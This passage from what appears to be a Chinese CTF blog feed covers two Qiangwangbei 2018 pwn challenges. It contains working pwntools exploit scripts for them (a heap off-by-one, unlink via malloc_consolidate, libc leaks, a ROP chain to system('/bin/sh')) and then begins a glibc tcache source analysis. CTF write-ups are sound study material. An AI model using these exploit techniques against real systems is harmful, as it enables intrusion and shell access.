debug:</span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.33.43'</span>, <span class="number">13572</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,punch)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'punch?\n'</span>)</span><br><span class="line">p.sendline(str(punch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x78</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x80</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">0x18</span>,<span class="string">'d'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;bbbbbbbb'</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap : '</span>, hex(heap_addr)</span><br><span class="line">offset = <span class="number">0x0000561b9016ec20</span> - <span class="number">0x561b9016edc0</span></span><br><span class="line">print_addr1 = heap_addr + offset</span><br><span class="line">offset2 = <span class="number">0x55f94cef9ed0</span> - <span class="number">0x55f94cef9dc0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] ptr_addr  : '</span>, hex(print_addr1)</span><br><span class="line">add(p64(print_addr1),<span class="string">'4'</span>)</span><br><span class="line">add(<span class="string">'e'</span>*<span class="number">10</span> , <span class="string">'e'</span>*<span class="number">0x80</span> + p64(heap_addr + offset2 <span class="number">-8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">PIE = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0XB30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] pie  : '</span>, hex(PIE)</span><br><span class="line">add(p64(PIE+elf.got[<span class="string">'puts'</span>]),<span class="string">'5'</span>)</span><br><span class="line">offset3 = <span class="number">0x55f960027f70</span> - <span class="number">0x55f960027dc0</span></span><br><span class="line">add(<span class="string">'f'</span>*<span class="number">10</span> , <span class="string">'f'</span>*<span class="number">0x80</span> + p64(heap_addr + offset3 <span class="number">-8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system  : '</span>, hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(p64(libc.address + <span class="number">0x4526a</span>),<span class="string">'6'</span>)</span><br><span class="line">block_exploit = heap_addr +<span class="number">0x5608f0cd5010</span> - <span class="number">0x5608f0cd4dc0</span></span><br><span class="line">add(<span class="string">'/bin/sh\0'</span>+<span class="string">'\x00'</span>*<span class="number">0x78</span> + p64(block_exploit) ,<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>此题最开始发现是标准的socket + fork写法，这样写法通常是会爆破canary或者地址，但是note这题暂时没用上。</p><p><strong>经AAA战队的大佬提醒，在note2题目中会用到，to becontinue…</strong></p><p>直接来看fork之后的函数，首先就是会getpwnam(”note“)操作，调试的时候，直接新建一个这个用户就能过了..</p><p>关键函数中，主要申请了3块内存</p><p><img src="/img/QWB2018/2_1.png" alt=""></p><p>对于title这个变量，是有限制的，遇到0x26232722403f210a任意一个时会截断，这样截断后会在堆块末尾写入这个截断值，此时会有一个溢出（off-by-one）。</p><p><img src="/img/QWB2018/2_2.png" alt=""></p><p>对于content变量，理论上智能改变3次，使用realloc进行扩容或者缩小。并且提供打印功能。</p><p><img src="/img/QWB2018/2_3.png" alt=""></p><p>对于comment变量是任意写的。</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题比较特殊的点在于题目没有free，当没有free时，就需要创造free了…</p><p>通过阅读realloc代码，可以发现其处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Try to expand forward into top */</span></span><br><span class="line">     <span class="keyword">if</span> (next == av-&gt;top &amp;&amp;</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">       &#123;</span><br><span class="line">       ...</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Try to expand forward into next chunk;  split off remainder below */</span></span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp;</span><br><span class="line">              !inuse (next) &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         newp = oldp;</span><br><span class="line">         unlink (av, next, bck, fwd);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* allocate, copy, free */</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">       **  newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">         <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">         newp = mem2chunk (newmem);</span><br><span class="line">         newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Avoid copy if newp is next chunk after oldp.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">         <span class="keyword">if</span> (newp == next)</span><br><span class="line">           &#123;</span><br><span class="line">             newsize += oldsize;</span><br><span class="line">             newp = oldp;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Unroll copy of &lt;= 36 bytes (72 if 8byte sizes)</span></span><br><span class="line"><span class="comment">                We know that contents have an odd number of</span></span><br><span class="line"><span class="comment">                INTERNAL_SIZE_T-sized words; minimally 3.</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">              ......   </span><br><span class="line"></span><br><span class="line">      **       _int_free (av, oldp, <span class="number">1</span>);</span><br><span class="line">             check_inuse_chunk (av, newp);</span><br><span class="line">             <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>在标**的行发现，realloc当想要拓展当前块的时候，会检查下一块释放被占用，如果被占用，则会利用int_malloc函数申请一个新的堆块，并且释放原来占用的堆块。</p><p>分析一下现状：</p><ul><li><p>存在一个指针数组在bss段上，指针会指向堆地址</p></li><li><p>存在off-by-one，可以修改content所在堆块大小，但只能修改为特定值，且小于原来的堆块大小</p></li><li><p>content前块和后块内容均可以任意写</p></li></ul><p>想到的一个思路是unlink，这样就可以劫持bss段的数组进而可以任意读任意写。</p><p>首先，想到content块会变小，如果与后面的堆空间unlink，会过不去libc的检测，因为没有指针指向后块地址，因此需要选择前块作为unlink的目标块，则size需要覆盖为pre_inuse为0的值（0x40），选定了这个值以后，前块的fake chunk就可以构造了。</p><p>然后，需要思考如何触发unlink。在第一次realloc时，libc会将改小的堆块放到fastbin中去，而这时需要如何触发unlink呢？</p><p>在查看代码中发现，malloc_consolidate函数会对fastbin链中各个堆块进行遍历，对符合前后块！inuse的堆块做unlink，这样恰好符合需求。</p><p>在什么时候会触发malloc_consolidate呢？在_int_malloc 中发现，在申请较大堆块，导致前面的一系列分配均无法满足时，会触发该函数。因此，我选择申请0x21000大小的堆块，该堆块大于brk分配的初始堆大小，则一定可以触发malloc_consolidate</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>剩下的步骤，就是如何构造前后堆块使其在malloc_consolidate中可以通过系统的check了。</p><p>当这一步完成时，在bss段上的指针数组里，就出现交叉的情况了，通过编辑title内容，就可以对bss段数组上的数据任意写，并且可以写多次。</p><p>首先利用got表泄露libc地址，然后再泄露libc中environ变量的地址（栈地址），最后对返回地址写入rop，就可以拿到shell了（其实最简单的方法是对__malloc_hook写one_gadget，但测试过程中，libc的四个one_gadget均不可用…）</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)<span class="comment">#process('./300')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.14.183'</span>, <span class="number">1234</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_title</span><span class="params">(title)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'title:'</span>)</span><br><span class="line">p.send(title)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_content</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(64-256):'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_comment</span><span class="params">(content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'comment:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_content</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome to the note '</span>)</span><br><span class="line">offset = int(p.recv(<span class="number">4</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*]'</span>, str(offset + <span class="number">0x10</span>),hex(offset +<span class="number">0x10</span>)</span><br><span class="line">change_content(<span class="number">0x78</span>,p64(<span class="number">0x41</span>)*(<span class="number">8</span>)+p64(<span class="number">0x80</span>)*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(<span class="number">0x11</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602070</span><span class="number">-0x18</span>)+p64(<span class="number">0x602070</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+<span class="string">'@'</span>)</span><br><span class="line">change_content(<span class="number">150</span>,<span class="string">'a'</span>*<span class="number">110</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(offset+<span class="number">0x10</span><span class="number">-0x20</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602070</span><span class="number">-0x18</span>)+p64(<span class="number">0x602070</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+<span class="string">'a'</span>)</span><br><span class="line">change_content(<span class="number">0x21000</span>,<span class="string">'a'</span>*<span class="number">110</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(<span class="number">0x602058</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line">show_content()</span><br><span class="line">p.recvuntil(<span class="string">'is:'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">change_comment(p64(<span class="number">0x602058</span>)+p64(libc.symbols[<span class="string">'environ'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line">show_content()</span><br><span class="line">p.recvuntil(<span class="string">'is:'</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack: '</span>,hex(stack_addr)</span><br><span class="line">offset =  <span class="number">0x7fffffffe4b8</span>- <span class="number">0x7fffffffe338</span> </span><br><span class="line">change_comment(p64(stack_addr - offset )+p64(libc.symbols[<span class="string">'environ'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">change_comment(p64(<span class="number">0x0000000000401673</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401670 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401672 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400e00 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401673 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401671 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c71 : ret</span></span><br><span class="line"><span class="string">0x00000000004002c1 : ret 0x200</span></span><br><span class="line"><span class="string">0x0000000000401300 : ret 0x8948</span></span><br><span class="line"><span class="string">0x00000000004012f6 : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000400fe5 : ret 0xb60f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      记录一下强网杯CTF 2018线上赛的两道PWN题.
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>tcache 源码分析及利用思路</title>
    <link href="http://p4nda.top/2018/03/20/tcache/"/>
    <id>http://p4nda.top/2018/03/20/tcache/</id>
    <published>2018-03-20T11:05:53.000Z</published>
    <updated>2018-07-05T13:42:23.827Z</updated>
    
    <content type="html"><![CDATA[<p>tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。</p><h1 id="总体简介"><a href="#总体简介" class="headerlink" title="总体简介"></a>总体简介</h1><p>tcache是一个用于加速malloc分配的缓存结构，有由64个链表组成。其优先级很高，会先于全部的bin来处理。每个链表的个数是一定的，当缓存链表装满时，分配方式就与之前版本的malloc相同。但使用了tcache版本的malloc与free函数时，对于堆块的安全性检查就相比于之前的版本弱化很多。</p><p>本文依据的代码是libc 2.26，最新出的libc 2.27似乎与2.26相差不多，多了一个SINGLE_THREAD_P变量，用于细化单线程与多线程的处理逻辑，对此研究不深。</p><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>tcache增加了两个全新的结构体，tcache_entry、tcache_perthread_struct。并且在libc内部定义了两个线程局部变量，该局部变量使得在每一个线程内部维护一个tcache结构，当在某线程内部释放内存时，无论内存块属于哪个分配区，都会挂到<strong>释放该内存块线程</strong>的tcache中。</p><p>tcache_entry结构体，看上去并不明白是做什么用的，但在分析代码中发现，这就是一个<strong>单链表结构指针</strong>。</p><p>tcache_pthread_struct结构体，是一个线程tcache的主体，由两个数组组成。其中，entries数据代表tcache的各个链表，共TCACHE_MAX_BINS个（默认为64），counts数组代表每一个单链表内有多少个内存块。</p><p>这个tcache结构的组装与<strong>fastbin</strong>非常相似 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>常量定义：从常量中可以看出，默认配置情况下，结构体最多的单链表个数是64个，每个单链表中最多有7个内存块，可容纳的最大内存块大小是1032。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure><h1 id="生成与调试"><a href="#生成与调试" class="headerlink" title="生成与调试"></a>生成与调试</h1><p>这部分应该写在下一部分，不过在我刚开始动手调试时就遇到了问题，就是 __thread 变量的问题，这个变量是线程内访问的，所以当我在gdb中使用  <strong>p tcache</strong> 命令输出结构体时出现了错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cannot find thread-local storage <span class="keyword">for</span> process 27690, shared library /lib/x86_64-linux-gnu/libc.so.6:</span><br><span class="line">Cannot find thread-local variables on this target</span><br></pre></td></tr></table></figure><p>就很懵，调试时不能查看结构体数值不就很蛋疼么。。。然后在博客内请教了大佬，还没回我，我就继续分析代码，找到了解决问题的方法（<em>如果有人知道如何直接查看，麻烦告知我</em>）</p><p>在代码中发现了一个初始化函数 tcache_init()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 